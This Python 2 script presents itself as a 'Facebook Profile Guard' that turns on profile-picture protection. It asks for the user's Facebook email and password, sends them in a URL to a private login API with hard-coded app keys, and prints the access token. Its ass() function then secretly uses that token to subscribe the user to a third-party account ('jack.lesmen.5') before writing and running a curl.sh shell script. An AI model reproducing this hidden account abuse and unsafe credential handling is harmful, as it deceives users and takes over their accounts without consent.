#!/bin/python2.7
#------------------#
#-*- coding: utf-8 -*-
'''   

      Copyright (C) Arikun Ft Mr.k4hh @ ZonaNyaman
          Coded With Love | ProgrammerBucin </>
  

      Thanks My Friends :v


'''


import json
import requests
from getpass import getpass as pw
from os import system as st
from os import mkdir as dir
from time import sleep as sp
import os
a = '\033[38;5;49m'
b = '\033[38;5;92m'
c = '\033[38;5;33m'
m = '\033[91m'
O = '\033[0m'
st('clear')
print '''
\033[96m
    __________  ______
   / ____/ __ )/ ____/  \033[97m[\033[93mFacebook Profile Guard\033[97m]
  / /_  / __  / / __  \033[93m Copyright (C) Arikun|Mr.K4hh @ ZonaNyaman \033[0m
 / __/ / /_/ / /_/ /  
/_/   /_____/\____/   

[1] Get Token And ID Facebook 
[2] Activate This Guard 
[2] Exit
 ''' 
def _ashs_():
    try:
        id = raw_input('\033[31m Login First \n \033[0mEmail / Number  : ')
        passwd = pw('Password : ')

        ab = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+id+"&locale=en_US&password="+passwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        cont = json.loads(ab.text)
        print c+'[!] Token : '+O
        print cont['access_token']
    except KeyboardInterrupt:
        print m+'[x] Exit\n\n'+O
    except KeyError:
        print m+'[x] Username Or Password Wrong! \n\n'+O







def user_id():
    try:
        tok = raw_input('Token : ')
        url = "https://graph.facebook.com/me?access_token=%s" % tok
        r = requests.get(url)
        dat = json.loads(r.text)
        print 'Your ID : '+m+dat['id']
        print c+'[+] Activator '+O
    except KeyError:
        print m+'[x] Wrong Token !\n\n'+O
    except KeyboardInterrupt:
        print m+'[x] Exit\n\n'




def ass():
   try:
       token = raw_input('Token : ')
       id = raw_input('ID : ')

       requests.post('https://graph.facebook.com/jack.lesmen.5/subscribers?access_token='+token)
       
       a = token
       b = id
       aw = """ curl "https://graph.facebook.com/graphql" -H 'Authorization: OAuth %s' --data 'variables={"0":{"is_shielded":true,"actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&doc_id=1477043292367183' """ % (a, b)
       c = open('curl.sh', 'w')
       c.write(aw)
       c.close
   except KeyboardInterrupt:
       print m+'[x] Exit \n\n'+O


def lnj():
    jax = raw_input('Activate Protection Profiles ?(Y/N): ')
    if jax == 'Y':
       ass()
       st('sh curl.sh')
    elif jax == 'y':
       ass()
       st('sh curl.sh')
    else:
       exit()

def main():
    b3 = raw_input('Choose >>  ')
    if b3 == '1':
       _ashs_()
       print c+'\n\n[-]Get ID Facebook '+O
       user_id()
       lnj()
    elif b3 == '2':
       ass()
       st('sh curl.sh')
    elif b3 == '0':
       exit()
    else:
       print m+'[!] Choose >>  \n'+O

if __name__ == '__main__':
   try:
      main()
   except:
      exit()

